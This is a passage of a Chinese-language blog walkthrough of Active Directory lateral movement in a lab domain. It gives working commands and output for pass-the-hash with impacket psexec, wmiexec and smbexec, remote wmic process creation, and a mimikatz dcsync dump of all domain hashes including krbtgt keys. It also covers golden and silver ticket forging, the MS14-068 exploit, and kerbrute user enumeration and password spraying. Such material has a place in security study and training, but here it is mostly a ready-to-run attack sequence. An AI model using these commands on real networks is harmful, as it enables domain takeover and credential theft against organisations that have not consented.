+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 吧目标机器上的pass.txt拷贝到本地</span><br><span class="line">coyp \\192.168.188.100\c$\users\administrator\desktop\pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看目标桌面1.txt文件内容</span><br><span class="line">type \\192.168.188.100\c$\users\administrator\desktop\1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318185531211.png" alt="image-20220318185531211"></p>
+<p>除此之外还有psexec，wmiexec，rpcdump等等，（之后再写）</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1829649">PTH(Pass The Hash)哈希传递攻击手法与防范</a></p>
+<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>这里的和上面的那个psexec不一样，这个是impacket套装里的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe Administrator@192.168.188.100 -hashes 00000000000000000000000000000000:520126a03f5d5a8d836f1c4f34ede7ce</span><br><span class="line">or</span><br><span class="line">psexec.exe Administrator@192.168.188.100 -hashes :520126a03f5d5a8d836f1c4f34ede7ce</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319161231967.png" alt="image-20220319161231967"></p>
+<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100 &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160157984.png" alt="image-20220319160157984"></p>
+<h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe  -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319160656572.png" alt="image-20220319160656572"></p>
+<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><blockquote>
+<p>  WMI以CIMOM为基础，CIMOM即<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%AC%E5%85%B1%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%9E%8B/2719581">公共信息模型</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E7%AE%A1%E7%90%86%E5%99%A8/21508570">对象管理器</a>（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E7%A8%8B%E5%BA%8F/1265903">脚本程序</a>提供了一个访问操作系统构成单元的公共接口。</p>
+</blockquote>
+<h4 id="查询进程信息"><a href="#查询进程信息" class="headerlink" title="查询进程信息"></a>查询进程信息</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /user:administrator /password:Admin123! process list brief</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165203798.png" alt="image-20220319165203798"></p>
+<h4 id="远程创建进程"><a href="#远程创建进程" class="headerlink" title="远程创建进程"></a>远程创建进程</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">192.168</span><span class="number">.188</span><span class="number">.100</span> /user:administrator /password:Admin123! process call create <span class="string">&quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165338212.png" alt="image-20220319165338212"></p>
+<h4 id="wmiexec-1"><a href="#wmiexec-1" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>上面写过了。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes :520126a03f5d5a8d836f1c4f34ede7ce ghost/dc@192.168.188.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319165549388.png" alt="image-20220319165549388"></p>
+<h2 id="PTT-Pass-the-ticket"><a href="#PTT-Pass-the-ticket" class="headerlink" title="PTT(Pass the ticket)"></a>PTT(Pass the ticket)</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>Golden Ticket（下面称为金票）是通过伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
+<p>条件：</p>
+<p>1、域名称 </p>
+<p>2、域的 SID 值 </p>
+<p>3、域的 KRBTGT 账号的 HASH </p>
+<p>4、伪造任意用户名</p>
+<p>得到kratgr的hash：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ghost.com /all /csv</span></span><br><span class="line">[DC] <span class="string">&#x27;ghost.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;WIN-4JS3YOGGQ2T.ghost.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;ghost.com&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">1001    WIN-4JS3YOGGQ2T$        b443a0863dfb6f394b46983d0d795fb6        532480</span><br><span class="line">1104    DM_WIN2003$     13e19dba1a1ad144d9bced3585afa9a9        4096</span><br><span class="line">500     Administrator   520126a03f5d5a8d836f1c4f34ede7ce        512</span><br><span class="line">1000    DC      520126a03f5d5a8d836f1c4f34ede7ce        544</span><br><span class="line">502     krbtgt  a5269d41b184a97adc9b991f2ee21f12        514</span><br><span class="line">1105    DM_WINXP$       5469d97f136d8662f65377f3ea8e4835        528384</span><br><span class="line">1107    yutao   520126a03f5d5a8d836f1c4f34ede7ce        66048</span><br><span class="line">1109    yutaowin10      520126a03f5d5a8d836f1c4f34ede7ce        66048</span><br><span class="line">1108    DM_WIN10$       bc3746c7020c2c97eac589107a57790f        4096</span><br><span class="line">1110    DM_WIN10_2$     aa5910b813ef7a8784d7522dad99ee07        4096</span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ghost.com /user:krbtgt</span></span><br><span class="line">[DC] <span class="string">&#x27;ghost.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;WIN-4JS3YOGGQ2T.ghost.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] <span class="string">&#x27;krbtgt&#x27;</span> will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 2022/3/16 18:25:33</span><br><span class="line">Object Security ID   : S-1-5-21-1238213221-2393825874-2881136966-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line">    ntlm- 0: a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line">    lm  - 0: dadc5e38f4551dd9bd6f8673528f3d6a</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : GHOST.COMkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : da6374753cb6f5e191265a283115ced1fe1d2c5e5091d60093903cb90ef67fb7</span><br><span class="line">      aes128_hmac       (4096) : 777c080c663f51196b554d5348ee8123</span><br><span class="line">      des_cbc_md5       (4096) : 5e83f83776ae8a1a</span><br><span class="line">      des_cbc_crc       (4096) : 5e83f83776ae8a1a</span><br><span class="line">      rc4_plain         (4096) : a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : GHOST.COMkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 5e83f83776ae8a1a</span><br><span class="line">      des_cbc_crc       : 5e83f83776ae8a1a</span><br><span class="line">      rc4_plain         : a5269d41b184a97adc9b991f2ee21f12</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    Kerberos-Newer-Keys</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    02  f11fc690746ff0c5017fbb804a5afadb</span><br><span class="line">    03  1284d4bd47f80c75715883ecae93aee3</span><br><span class="line">    04  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    05  f11fc690746ff0c5017fbb804a5afadb</span><br><span class="line">    06  f0858287a155ee5ea15271dca0c480c3</span><br><span class="line">    07  b56b310c7d4d84d51763197cc777e236</span><br><span class="line">    08  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    09  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    10  053d15785d6b8e58659321a0c0bbe730</span><br><span class="line">    11  910f26088b80677ff20523ae2f570ad2</span><br><span class="line">    12  bc8cf0c0bb41ee11fd93ce726577cd2e</span><br><span class="line">    13  37dca035e5d9ce4b7539b40dd4a3b711</span><br><span class="line">    14  910f26088b80677ff20523ae2f570ad2</span><br><span class="line">    15  c01bc6cc7073767ae9332d6948012efb</span><br><span class="line">    16  c01bc6cc7073767ae9332d6948012efb</span><br><span class="line">    17  5bef1b58b30a684217b555a9c694b018</span><br><span class="line">    18  c7ddf9a29f31081a0c2c59f0ba887591</span><br><span class="line">    19  6ed3c0509d5ed0b11be6d3cb7d9eec89</span><br><span class="line">    20  2230919d6c19fdc4794a4d4cbf08cbcc</span><br><span class="line">    21  f5e434234d81d0ba2362f17a8b4a61a0</span><br><span class="line">    22  f5e434234d81d0ba2362f17a8b4a61a0</span><br><span class="line">    23  4cf7197a9331618814144057e85b32b6</span><br><span class="line">    24  ada6252d89f49e2cc822fb2545c8a4ac</span><br><span class="line">    25  ada6252d89f49e2cc822fb2545c8a4ac</span><br><span class="line">    26  55c19bbc0da0e9ae00a609c755da8ef5</span><br><span class="line">    27  9df3396f69d865ef7b7fabdd30e5c225</span><br><span class="line">    28  b8685ccf3967652956f90dd8c912dd9f</span><br><span class="line">    29  534307dab20bfd1901a972ed1196c351</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用 mimikatz 生成金票生成.kirbi 文件并保存：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:new_user_gold /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-502 /krbtgt:a5269d41b184a97adc9b991f2ee21f12 /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID 值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt 的 HASH 值</span><br><span class="line">/ticket：生成的票据名称 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200338986.png" alt="image-20220318200338986"></p>
+<p>登录域内普通用户，通过 mimikatz 中的 kerberos::ptt 功能将ticket.kirbi 导入内存中。</p>
+<p>导入票据之前访问域控:</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318200449833.png" alt="image-20220318200449833"></p>
+<p>导入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">Ticket(s) purge for current session is OK</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::ptt C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kirbi</span><br><span class="line"></span><br><span class="line">* File: &#x27;C:\Users\yutaowin10\Desktop\Tool\mimikatz\ticket.kir</span><br></pre></td></tr></table></figure>
+
+<p>再次访问域控即可成功。</p>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p>
+<p>1.不需要与 KDC 进行交互 </p>
+<p>2.需要 server 的 NTLM hash</p>
+<p>mimikatz：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318202007613.png" alt="image-20220318202007613"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ghost.com /sid:S-1-5-21-1238213221-2393825874-2881136966-500 /target:WIN-4JS3YOGGQ2T.ghost.com /service:cifs /rc4:520126a03f5d5a8d836f1c4f34ede7ce /user:new_user_gold /ptt</span><br><span class="line"></span><br><span class="line">/domain</span><br><span class="line">/sid</span><br><span class="line">/target:目标服务器的域名全称，此处为域控的全称</span><br><span class="line">/service:目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line">/rc4:计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line">/user:要伪造的用户名</span><br></pre></td></tr></table></figure>
+
+<p>此时可以成功访问域控上的文件共享</p>
+<h3 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h3><h4 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h4><ul>
+<li>  Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li>
+<li>  Silver Ticket: 伪造TGS,只能访问指定的服务</li>
+</ul>
+<h4 id="2-加密方式不同"><a href="#2-加密方式不同" class="headerlink" title="2.加密方式不同"></a>2.加密方式不同</h4><ul>
+<li>  Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li>
+<li>  Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li>
+</ul>
+<h4 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h4><ul>
+<li>  Golden Ticket 的利用过程需要访问域控(KDC)</li>
+<li>  Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li>
+</ul>
+<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>能够将任意一台域机器提升成域控相关权限</p>
+<p>利用条件：</p>
+<ul>
+<li>  小于2012R2的域控没有打KB3011780，高版本默认集成</li>
+<li>  无论工作组、域，高低权限都可以使用生成的票据进行攻击</li>
+<li>  域账户使用时需要klist purge清除票据</li>
+</ul>
+<p>环境：</p>
+<blockquote>
+<p>  域控：2008，192.168.188.100，主机名：WIN-4JS3YOGGQ2T</p>
+<p>  域成员：192.168.188.104 ，yutaowin10 ，Admin123！</p>
+</blockquote>
+<p>获取域用户的sid：</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318194110678.png" alt="image-20220318194110678"></p>
+<p>直接生成票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u yutaowin10@ghost.com -s S-1-5-21-1238213221-2393825874-2881136966-1109 -d 192.168.188.100 -p Admin123!</span><br></pre></td></tr></table></figure>
+
+<p>使用生成的票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_yutaowin10@ghost.com.ccache</span><br></pre></td></tr></table></figure>
+
+<p>通过域控的主机名访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-4JS3YOGGQ2T\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="域外用户枚举"><a href="#域外用户枚举" class="headerlink" title="域外用户枚举"></a>域外用户枚举</h3><p>在域外也能和域进行交互的原因，是利用了kerberos协议认证中的AS-REQ阶段。只要我们能够访问域控88(kerberos服务)端口，就可以通过这种方式去枚举用户名并且进行kerberos协议的暴力破解了！</p>
+<p>Kerbrute使用的是kerberos pre-auth协议，不会产生大量的日志 (4625 - An account failed to log on)，但是会产生以下日志：</p>
+<ul>
+<li>  口令验证成功时产生日志 (4768 - A Kerberos authentication ticket (TGT) was requested)</li>
+<li>  口令验证失败时产生日志 (4771 - Kerberos pre-authentication failed)</li>
+</ul>
+<h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><h5 id="kerbrute-windows-amd64-exe"><a href="#kerbrute-windows-amd64-exe" class="headerlink" title="kerbrute_windows_amd64.exe"></a>kerbrute_windows_amd64.exe</h5><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">kerbrute_windows_amd64.exe</a></p>
+</blockquote>
+<p>在这里我们需要获取dc的ip，域名。将想要爆破的用户放入user.txt表中，这样就可以获取到了！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.188.100 -d ghost.com user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191443842.png" alt="image-20220318191443842"></p>
+<p>之后爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray -d 192.168.188.100 -d ghost.com Admin123!</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220318191719021.png" alt="image-20220318191719021"></p>
+<h4 id="PY版本-pyKerbrute"><a href="#PY版本-pyKerbrute" class="headerlink" title="PY版本 pyKerbrute"></a>PY版本 pyKerbrute</h4><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></p>
+</blockquote>
+<p>不演示了，爆破用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 EnumADUser.py 192.168.188.100 ghost.com user.txt tcp</span><br><span class="line">python2 EnumADUser.py 192.168.188.100 ghost.com user.txt udp</span><br></pre></td></tr></table></figure>
+
+<p>口令爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#明文</span><br><span class="line">python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt clearpassword Admin123! tcp</span><br><span class="line"></span><br><span class="line">#hash</span><br><span class="line">python2 ADPwdSpray.py 192.168.188.100 ghost.com user.txt ntlmhash aaaaaaaaaaaaaaaaaaaa(hash) udp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：</p>
+<blockquote>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/-V1gEpdsUExwU5Fza2YzrA</span><br><span class="line">https://mp.weixin.qq.com/s/vYeR9FDRUfN2ZczmF68vZQ</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;mid=2247496592&amp;idx=2&amp;sn=3805d213ba1013e320f48169516c2ca3&amp;chksm=e91523aade62aabc21ebca36a5216f63ec0d4c61e3dd1b4632c10adbb85dfde07e6897897fa5&amp;scene=21#wechat_redirect</span><br><span class="line">https://blog.csdn.net/weixin_41598660/article/details/109152077</span><br><span class="line">https://xz.aliyun.com/t/7724#toc-4</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</span><br><span class="line">http://hackergu.com/ad-information-search-powerview/</span><br><span class="line">https://www.freebuf.com/news/173366.html</span><br><span class="line">https://www.cnblogs.com/mrhonest/p/13372203.html</span><br><span class="line">https://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</span><br><span class="line">https://github.com/dafthack/DomainPasswordSpray</span><br><span class="line">https://blog.csdn.net/qq_36119192/article/details/105088239</span><br><span class="line">https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="SPN-扫描"><a href="#SPN-扫描" class="headerlink" title="SPN 扫描"></a>SPN 扫描</h2><blockquote>
+<p>  SPN全程 Service Principal Names，是服务器上所运行服务的唯一标识，每个使用kerberos认证的服务都需要一个SPN。<br>  SPN分为两种，一种注册在AD的机器账户下(Computers)下，另一种注册在域用户账户(Users)下<br>  当一个服务的权限为Local System或Network Service，则SPN注册在机器账户(Computers)下<br>  当一个服务的权限为一个域用户，则SPN注册在域用户账户(Users)下</p>
+</blockquote>
+<p>SPN扫描能让我们更快的发现在域内运行的服务，并且很难被发现</p>
+<h3 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<ul>
+<li>  serviceclass可以理解为服务的名称，常见的有www,ldap,SMTP,DNS,HOST等</li>
+<li>  host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
+<li>  如果服务运行在默认端口上，则端口号(port)可以省略</li>
+</ul>
+<h3 id="SPN-查询"><a href="#SPN-查询" class="headerlink" title="SPN 查询"></a>SPN 查询</h3><p>查看当前域内的所有SPN:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure>
+
+<p>查询具体域所有SPN：</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220319170505083.png" alt="image-20220319170505083"></p>
+<p>以CN开头的每一行代表一个账户，下面的信息是与之关联的SPN<br>对于上面的输出数据，机器账户(Computers)为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CN=WIN-4JS3YOGGQ2T,OU=Domain Controllers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN2003,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WINXP,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN10,CN=Computers,DC=ghost,DC=com</span><br><span class="line">CN=DM_WIN10_2,CN=Computers,DC=ghost,DC=com</span><br></pre></td></tr></table></figure>
+
+<p>域用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=krbtgt,CN=Users,DC=ghost,DC=com</span><br></pre></td></tr></table></figure>
+
+<h2 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h2>
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/" title="dompdf 0day(RCE)复现">
